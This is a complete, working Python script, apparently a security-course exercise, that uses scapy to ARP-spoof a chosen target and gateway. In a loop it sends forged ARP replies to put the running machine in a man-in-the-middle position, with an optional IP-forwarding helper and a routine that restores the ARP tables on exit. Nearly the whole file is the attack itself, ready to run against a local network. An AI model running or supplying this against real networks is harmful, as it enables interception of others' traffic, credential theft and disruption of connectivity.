#!/usr/bin/env python3

import scapy.all as scapy
import time
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP to spoof")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
    (options) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP. Use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify the gateway to spoof. Use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)                                  
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")                  
    arp_request_broadcast = broadcast/arp_request                       
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]      
    return answered_list[0][1].hwsrc


def port_forward():
    """ *experimental* terminal will need to be run as root """
    try:
        subprocess.call("echo '1' > /proc/sys/net/ipv4/ip_forward")
    except:
        print("Port forwarding error")
        

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)   # if no hwsrc is specified, scapy will use our own MAC
    scapy.send(packet, verbose=False)   # verbose=False removes the recurring print statement included with the function


def restore(destination_ip, source_ip):
    """ restore the ARP tables when the program exits """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) # send the packet 4 times

    # print the packet details and summary
    # print(packet.show())
    # print(packet.summary())

options = get_arguments()
# target_ip = "10.0.2.15"
# gateway_ip = "10.0.2.1"


# call the ip_forward function to allow ip forwarding from MITM machine
# port_forward()

# create a counter for packets sent
sent_packets_count = 0

# keep sending packets to spoof the target
# dynamically print the number of packets sent
try:
    while True:
        spoof(options.target_ip, options.gateway_ip)  # tell the target that we are the router
        spoof(options.gateway_ip, options.target_ip)  # tell the router that we are the target
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # print at line start and remove \n (python3 method)
        time.sleep(2)                   # create a 2 sec delay between packets to avoid flooding
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables...Please wait.\n.")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)




######################################################################################################################
# TODO try to implement port forwarding with the arp-spoofer
